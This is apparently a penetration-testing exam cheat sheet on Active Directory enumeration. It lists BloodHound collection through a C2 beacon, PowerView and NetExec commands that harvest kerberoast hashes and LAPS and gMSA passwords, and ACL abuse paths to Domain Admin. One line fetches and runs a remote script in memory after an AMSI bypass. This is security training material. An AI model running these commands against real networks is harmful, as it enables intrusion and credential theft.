# Phase 08: Active Directory Enumeration

> Map the domain. BloodHound finds the path. Know this cold — you have 10 minutes budgeted.

---

## 1. BloodHound Collection (First Priority)

```bash
# From Kali with domain creds (if DC reachable directly):
bloodhound-python -u username -p Password1 -d domain.local -dc dc01.domain.local -c All --zip -o ~/exam/bh-data/

# From C2 beacon (execute-assembly — in-memory):
sliver (beacon) > execute-assembly /tools/SharpHound.exe -c All --zipfilename bh.zip --stealth
sliver (beacon) > download C:\\Windows\\Temp\\bh.zip ~/exam/bh-data/

# Start BloodHound and load the zip
sudo neo4j start
bloodhound &
# Upload zip → Analysis tab → run queries
```

---

## 2. Essential BloodHound Queries (Run Immediately)

```
1. "Find Shortest Paths to Domain Admins"       ← run first, always
2. "Find AS-REP Roastable Users"               ← quick win if found
3. "Find Kerberoastable Users"                 ← most common exam path
4. "Find Principals with DCSync Rights"        ← check for misconfigured users
5. "Shortest Paths from Owned Principals"      ← after marking your account as Owned
6. "Find Computers with Unconstrained Delegation" ← non-DC = high value
7. "Find AD CS ESC1 Templates"                 ← if ADCS is in scope
```

Mark every compromised account as **Owned** (right-click → Mark as Owned) before running path queries.

---

## 3. PowerView Manual Enumeration

```powershell
# Load (after AMSI bypass)
IEX (New-Object Net.WebClient).DownloadString('http://<ip>/PowerView.ps1')

# Domain overview
Get-Domain; Get-DomainController; Get-DomainSID

# Find Kerberoastable + AS-REP targets
Get-DomainUser -SPN | Select samaccountname, serviceprincipalname
Get-DomainUser -PreauthNotRequired | Select samaccountname

# Delegation
Get-DomainComputer -Unconstrained | Select name           # non-DC = target
Get-DomainComputer -TrustedToAuth | Select name, msds-allowedtodelegateto
Get-DomainUser -TrustedToAuth | Select samaccountname, msds-allowedtodelegateto

# ACL hunting
Get-DomainObjectACL -ResolveGUIDs | ? {$_.IdentityReferenceName -match "your_user"}

# Where is DA logged in?
Invoke-UserHunter -GroupName "Domain Admins" -CheckAccess

# Interesting shares
Find-DomainShare -CheckShareAccess
Find-InterestingDomainShareFile -Include *.txt,*.xml,*.config,*.kdbx

# GPOs
Get-DomainGPO | Select displayname, gpcfilesyspath
```

---

## 4. LDAP Quick Checks (From Kali)

```bash
# ldapdomaindump — HTML output, easy to browse
ldapdomaindump -u 'domain\username' -p Password1 ldap://<dc_ip> -o ~/exam/ldap/

# NetExec LDAP enumeration
nxc ldap <dc_ip> -u username -p Password1 --users
nxc ldap <dc_ip> -u username -p Password1 --groups
nxc ldap <dc_ip> -u username -p Password1 --kerberoasting ~/exam/kerberoast.txt
nxc ldap <dc_ip> -u username -p Password1 --asreproast ~/exam/asrep.txt
nxc ldap <dc_ip> -u username -p Password1 -M laps      # LAPS passwords
nxc ldap <dc_ip> -u username -p Password1 -M gmsa      # gMSA passwords
nxc ldap <dc_ip> -u username -p Password1 -M maq       # MachineAccountQuota
```

---

## 5. Trust Enumeration

```powershell
Get-DomainTrust
Get-ForestTrust
Get-DomainTrustMapping
```

If trusts exist → see Phase 09/10 for cross-domain paths.

---

## Key ACL Rights to Spot in BloodHound

| Edge | What you can do |
|------|----------------|
| GenericAll | Full control — reset password, add to group, anything |
| GenericWrite | Write any property — set SPN (Kerberoast) or RBCD |
| WriteDACL | Add DCSync rights or GenericAll to yourself |
| WriteOwner | Become owner → WriteDACL → GenericAll |
| AddMember | Add yourself to a group (DA, etc.) |
| ForceChangePassword | Reset password without knowing old one |

---

## Next Step

Found Kerberoastable / AS-REP / delegation targets → **Phase 09: Kerberos Attacks** (`09-kerberos-attacks.md`)
Found ACL path to DA → **Phase 10: Domain Privilege Escalation** (`10-domain-privesc.md`)
